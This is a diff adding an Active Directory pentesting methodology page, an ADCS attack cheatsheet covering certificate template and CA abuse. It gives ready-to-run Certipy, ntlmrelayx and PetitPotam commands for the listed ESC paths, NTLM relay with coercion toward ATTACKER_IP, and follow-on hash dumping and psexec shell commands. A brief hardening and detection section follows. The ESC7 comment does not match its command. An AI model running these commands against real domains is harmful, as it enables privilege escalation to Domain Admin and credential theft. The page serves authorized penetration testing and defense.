@@ -1,0 +1,351 @@
+---
+title: "Part 6: Exploiting AD Certificate Services (ADCS)"
+description: "The complete ADCS attack cheatsheet — ESC1 through ESC11, certificate template abuse, NTLM relay to ADCS, and certificate-based persistence."
+category: Methodology
+subcategory: Active Directory Attack
+order: 6
+tags: ["active-directory", "adcs", "certificates", "esc1", "certipy", "pentesting"]
+updated: 2026-04-11
+---
+
+# Part 6: Exploiting AD Certificate Services (ADCS)
+
+Active Directory Certificate Services (ADCS) is arguably the most overlooked attack surface in AD. The "Certified Pre-Owned" research by SpecterOps documented a series of escalation paths (ESC1–ESC8), and subsequent research has added ESC9–ESC13. A single misconfigured certificate template can give any domain user a direct path to Domain Admin.
+
+**Primary tool:** [Certipy](https://github.com/ly4k/Certipy) — handles enumeration, exploitation, and authentication.
+
+---
+
+## Enumeration
+
+### Find All ADCS Vulnerabilities
+
+```bash
+# Full enumeration — outputs JSON, text, and BloodHound data
+certipy find -u user@domain.local -p 'password' -dc-ip DC_IP
+
+# Vulnerable templates only
+certipy find -u user@domain.local -p 'password' -dc-ip DC_IP -vulnerable
+
+# Output includes:
+# - Certificate Authorities
+# - Certificate templates with permissions
+# - Vulnerable configurations flagged by ESC number
+```
+
+```powershell
+# Certify (C# alternative)
+Certify.exe find /vulnerable
+
+# PowerShell
+Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties * | 
+  select name, msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag, pkiExtendedKeyUsage
+```
+
+### Key Template Properties to Inspect
+
+| Property | Dangerous Value | Why |
+|---|---|---|
+| `msPKI-Certificate-Name-Flag` | `ENROLLEE_SUPPLIES_SUBJECT` | User controls the SAN — can impersonate anyone |
+| `pkiExtendedKeyUsage` | Client Authentication / Any Purpose / SubCA | Allows authentication |
+| Enrollment permissions | Low-priv users can enroll | Template is accessible |
+| Manager approval | Disabled | No human gatekeeping |
+| Authorized signatures | 0 | No co-signing required |
+
+---
+
+## ESC1 — Misconfigured Certificate Template (SAN Abuse)
+
+**Severity:** 🔴 Critical
+
+The most common and impactful ADCS vulnerability. If a template allows the enrollee to specify a Subject Alternative Name (SAN) AND has Client Authentication EKU AND low-privilege users can enroll — any user can get a certificate as Domain Admin.
+
+### Conditions Required (all must be true)
+
+1. `ENROLLEE_SUPPLIES_SUBJECT` flag is set
+2. Template has **Client Authentication** (or Any Purpose) EKU
+3. Low-privilege users have enrollment rights
+4. Manager approval is NOT required
+5. No authorized signatures required
+
+### Exploitation
+
+```bash
+# Request certificate with administrator SAN
+certipy req -u user@domain.local -p pass \
+  -ca 'YOURCA-CA' \
+  -template 'VulnerableTemplate' \
+  -upn administrator@domain.local
+
+# Authenticate with the certificate → get NT hash
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+
+# Output:
+# [*] Got hash for 'administrator@domain.local': aad3b435...:8846f7ea...
+
+# Use the hash for DCSync, PtH, etc.
+secretsdump.py domain.local/administrator@dc01 -hashes :8846f7ea...
+```
+
+---
+
+## ESC2 — Any Purpose / SubCA EKU
+
+**Severity:** 🟠 High
+
+Template with **Any Purpose** OID (`2.5.29.37.0`) or **SubCA** EKU. Any Purpose certificates can be used for client authentication (like ESC1). SubCA certificates let you issue your own certificates.
+
+```bash
+# Same exploitation as ESC1 if ENROLLEE_SUPPLIES_SUBJECT is set
+certipy req -u user@domain.local -p pass \
+  -ca YOURCA -template VulnTemplate \
+  -upn administrator@domain.local
+```
+
+---
+
+## ESC3 — Enrollment Agent Templates
+
+**Severity:** 🟠 High
+
+A two-step attack using enrollment agent certificates. Step 1: Enroll in an "Enrollment Agent" template. Step 2: Use that agent certificate to request a certificate on behalf of another user.
+
+```bash
+# Step 1: Get enrollment agent certificate
+certipy req -u user@domain.local -p pass \
+  -ca YOURCA -template EnrollmentAgent
+
+# Step 2: Use it to request a cert as administrator
+certipy req -u user@domain.local -p pass \
+  -ca YOURCA -template User \
+  -on-behalf-of 'domain\administrator' \
+  -pfx enrollment_agent.pfx
+
+# Step 3: Authenticate
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+```
+
+---
+
+## ESC4 — Vulnerable Template ACLs
+
+**Severity:** 🔴 Critical
+
+If you have **write access** to a certificate template object in AD, you can modify it to be ESC1-vulnerable, exploit it, then restore it.
+
+### Conditions
+
+You need one of: `GenericAll`, `GenericWrite`, `WriteDACL`, or `WriteOwner` on the template object.
+
+```bash
+# Save current template config, modify to be vulnerable
+certipy template -u user@domain.local -p pass \
+  -template VulnTemplate -save-old
+
+# Template is now ESC1-exploitable
+certipy req -u user@domain.local -p pass \
+  -ca YOURCA -template VulnTemplate \
+  -upn administrator@domain.local
+
+# Restore original template
+certipy template -u user@domain.local -p pass \
+  -template VulnTemplate \
+  -configuration VulnTemplate.json
+```
+
+---
+
+## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
+
+**Severity:** 🔴 Critical
+
+If the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled, **every** template becomes ESC1 — the CA will accept SANs in the request regardless of the template setting.
+
+```bash
+# Check if the flag is set
+certipy find -u user@domain.local -p pass -dc-ip DC_IP
+# Look for: "User Specified SAN: Enabled" on the CA
+
+# Exploit any template with Client Auth EKU
+certipy req -u user@domain.local -p pass \
+  -ca YOURCA -template User \
+  -upn administrator@domain.local
+```
+
+---
+
+## ESC7 — Vulnerable CA ACLs
+
+**Severity:** 🔴 Critical
+
+If you have **ManageCA** permission on the Certificate Authority, you can enable the ESC6 flag yourself, then exploit any template.
+
+```bash
+# Step 1: Enable the SAN flag (requires ManageCA)
+certipy ca -u user@domain.local -p pass \
+  -ca YOURCA -enable-template SubCA
+
+# If you also have ManageCertificates, you can issue failed requests:
+# Step 1: Request a cert (it may fail/pend)
+certipy req -u user@domain.local -p pass \
+  -ca YOURCA -template SubCA \
+  -upn administrator@domain.local
+
+# Step 2: Issue the pending request
+certipy ca -u user@domain.local -p pass \
+  -ca YOURCA -issue-request <REQUEST_ID>
+
+# Step 3: Retrieve the issued certificate
+certipy req -u user@domain.local -p pass \
+  -ca YOURCA -retrieve <REQUEST_ID>
+```
+
+---
+
+## ESC8 — NTLM Relay to ADCS HTTP Enrollment
+
+**Severity:** 🔴 Critical
+
+The ADCS web enrollment endpoint (`/certsrv/`) accepts NTLM authentication. If EPA (Extended Protection for Authentication) is not enabled, you can relay NTLM authentication to this endpoint.
+
+*See [Part 4: Automated Relays](/docs/methodology/active-directory-attack/03-automated-relays) for the full relay setup.*
+
+```bash
+# Terminal 1: Start relay to ADCS
+ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+# Terminal 2: Coerce DC authentication
+PetitPotam.py ATTACKER_IP DC01_IP
+
+# Terminal 3: Use the certificate
+certipy auth -pfx dc01.pfx -dc-ip DC_IP
+```
+
+---
+
+## ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)
+
+**Severity:** 🟠 High
+
+If a template has `CT_FLAG_NO_SECURITY_EXTENSION` and `StrongCertificateBindingEnforcement` is not set to 2, the `szOID_NTDS_CA_SECURITY_EXT` extension is not embedded. Combined with `GenericWrite` on a user, you can change their UPN to an admin's UPN, enroll, then change it back.
+
+```bash
+# Change victim's UPN to administrator's
+certipy account update -u user@domain.local -p pass \
+  -user victim -upn administrator@domain.local
+
+# Enroll
+certipy req -u victim@domain.local -p pass \
+  -ca YOURCA -template VulnTemplate
+
+# Restore UPN
+certipy account update -u user@domain.local -p pass \
+  -user victim -upn victim@domain.local
+
+# Authenticate as administrator
+certipy auth -pfx administrator.pfx -domain domain.local
+```
+
+---
+
+## ESC11 — NTLM Relay to RPC Certificate Enrollment
+
+**Severity:** 🟠 High
+
+Similar to ESC8, but targets the RPC enrollment interface (ICPR) instead of HTTP. Requires the CA to have the `IF_ENFORCEENCRYPTICERTREQUEST` flag disabled.
+
+```bash
+# Relay to RPC enrollment
+certipy relay -ca ca.domain.local -template DomainController
+
+# Coerce authentication
+PetitPotam.py ATTACKER_IP DC01_IP
+```
+
+---
+
+## ESC Quick Reference
+
+| ESC | Vulnerability | Key Condition |
+|---|---|---|
+| **ESC1** | Enrollee supplies SAN | `ENROLLEE_SUPPLIES_SUBJECT` + Client Auth |
+| **ESC2** | Any Purpose / SubCA EKU | Overly broad EKU |
+| **ESC3** | Enrollment Agent abuse | Two-step delegation |
+| **ESC4** | Writable template ACLs | GenericAll/Write on template |
+| **ESC5** | Vulnerable PKI object ACLs | Write on CA, NTAuth, root certs |
+| **ESC6** | SAN flag on CA | `EDITF_ATTRIBUTESUBJECTALTNAME2` |
+| **ESC7** | ManageCA permissions | Enable templates / issue requests |
+| **ESC8** | NTLM relay to HTTP enrollment | No EPA on web enrollment |
+| **ESC9** | No security extension + UPN change | `CT_FLAG_NO_SECURITY_EXTENSION` |
+| **ESC10** | Weak certificate mapping | `StrongCertificateBindingEnforcement = 0` |
+| **ESC11** | NTLM relay to RPC enrollment | No encryption enforcement on ICPR |
+
+---
+
+## Certificate Authentication Flow
+
+Once you have a certificate (`.pfx` file), authentication works like this:
+
+```bash
+# PKINIT: Certificate → TGT → NT hash
+certipy auth -pfx admin.pfx -dc-ip DC_IP
+
+# This uses Kerberos PKINIT to get a TGT, then
+# UnPAC-the-hash to recover the NT hash
+
+# You can then use the hash for:
+secretsdump.py domain.local/administrator@dc01 -hashes :NTHASH  # DCSync
+psexec.py domain.local/administrator@dc01 -hashes :NTHASH       # Shell
+```
+
+---
+
+## Defense & Detection
+
+### Hardening
+
+| Control | What It Prevents |
+|---|---|
+| **Disable `ENROLLEE_SUPPLIES_SUBJECT`** on all templates | ESC1 |
+| **Restrict enrollment permissions** | ESC1, ESC2, ESC3 |
+| **Audit template ACLs** | ESC4 |
+| **Disable `EDITF_ATTRIBUTESUBJECTALTNAME2`** | ESC6 |
+| **Restrict ManageCA permission** | ESC7 |
+| **Enable EPA on web enrollment** | ESC8 |
+| **Enable `StrongCertificateBindingEnforcement = 2`** | ESC9, ESC10 |
+| **Require manager approval** on sensitive templates | All ESC |
+| **Remove unused templates** | Reduces attack surface |
+
+### Detection (Event IDs)
+
+| Event ID | Source | What It Catches |
+|---|---|---|
+| **4886** | CA | Certificate request received |
+| **4887** | CA | Certificate issued |
+| **4888** | CA | Certificate request denied |
+| **4899** | CA | Certificate template updated |
+
+### Monitoring Queries
+
+```powershell
+# List recently issued certificates
+certutil -view -out "Request ID,Requester Name,Certificate Template,Certificate Hash,NotAfter"
+
+# Check for SAN flag on templates
+certutil -v -dstemplate | findstr /I "msPKI-Certificate-Name-Flag"
+```
+
+&nbsp;
+
+&nbsp;
+
+---
+
+> **Next up → [Part 7: Exploiting Domain Trusts](/docs/methodology/active-directory-attack/07-domain-trusts)** — Golden Tickets, SID history injection, inter-realm trust abuse, and cross-forest attacks.
+
+&nbsp;
+
+## Related Writeups
+
+*Writeups that put these techniques into practice will be linked here.*
